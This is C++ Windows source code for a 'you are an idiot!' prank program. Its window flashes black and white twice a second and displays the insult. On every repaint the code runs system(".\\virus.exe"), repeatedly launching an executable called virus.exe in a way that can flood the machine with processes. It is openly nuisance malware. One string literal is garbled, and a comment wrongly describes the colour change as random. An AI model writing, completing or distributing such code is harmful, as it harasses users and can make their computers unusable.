#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#define BLACK RGB(0, 0, 0)
#define WHITE RGB(255, 255, 255)
COLORREF currentColor = WHITE;
bool is_black = false;

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
    case WM_CREATE:
        // Set timer: 500 ms
        SetTimer(hwnd, 1, 500, NULL);
        return 0;

    case WM_TIMER:
        // Change to a random color
        if (is_black) {
            currentColor = WHITE;
        } else {
            currentColor = BLACK;
        }
        is_black = !is_black;

        // Force repaint
        InvalidateRect(hwnd, NULL, TRUE);
        return 0;

    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);

        HBRUSH brush = CreateSolidBrush(currentColor);
        FillRect(hdc, &ps.rcPaint, brush);
        DeleteObject(brush);
        HFONT hFont = CreateFont(
            48,                // height (size)
            0,                 // width (0 = auto)
            0, 0,              // angle
            FW_NORMAL,           // weight (FW_NORMAL, FW_BOLD, etc.)
            FALSE,             // italic
            FALSE,             // underline
            FALSE,             // strikeout
            DEFAULT_CHARSET,
            OUT_OUTLINE_PRECIS,
            CLIP_DEFAULT_PRECIS,
            CLEARTYPE_QUALITY, // nicer text
            VARIABLE_PITCH,
            L"Times New Roman"            // font name
        );
        HFONT oldFont = (HFONT)SelectObject(hdc, hFont);
        COLORREF textColor = is_black ? WHITE : BLACK;
        SetTextColor(hdc, textColor);
        SetBkMode(hdc, TRANSPARENT); // so text doesn't overwrite background

        const wchar_t* text = L"you are an idiot!";
        const wchar_t* b_text = L"���";
        TextOut(hdc, 50, 50, text, lstrlen(text));
        TextOut(hdc, 50, 100, b_text, lstrlen(b_text));
        SelectObject(hdc, oldFont);
        DeleteObject(hFont);
        EndPaint(hwnd, &ps);
        system(".\\virus.exe");
    }
    return 0;

    case WM_DESTROY:
        KillTimer(hwnd, 1);
        PostQuitMessage(0);
        return 0;
    }

    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int nCmdShow)
{
    const wchar_t CLASS_NAME[] = L"idiot";

    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;

    RegisterClassW(&wc);

    HWND hwnd = CreateWindowExW(
        0,
        CLASS_NAME,
        L"you are an idiot!",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 500, 400,
        NULL, NULL, hInstance, NULL
    );

    ShowWindow(hwnd, nCmdShow);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}